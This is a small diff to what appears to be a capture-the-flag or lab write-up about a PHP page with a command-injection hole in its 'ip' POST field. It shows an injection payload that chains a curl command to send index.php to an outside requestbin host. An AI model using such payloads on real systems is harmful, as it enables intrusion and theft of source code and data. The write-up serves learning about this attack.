@@ -33,5 +33,5 @@ if(isset($_POST["ip"]) && !empty($_POST["ip"])){
 
 How can i get these code? :
 
-Register : https://pipedream.com/
-Command : ; curl --data-urlencode "content@index.php" https://*****.m.pipedream.net # Server will sent code to u via requestbin
+Register : https://pipedream.com/requestbin
+Command : ; curl --data-urlencode "content@index.php" https://*****.m.pipedream.net # Server will sent code to u via requestbin.
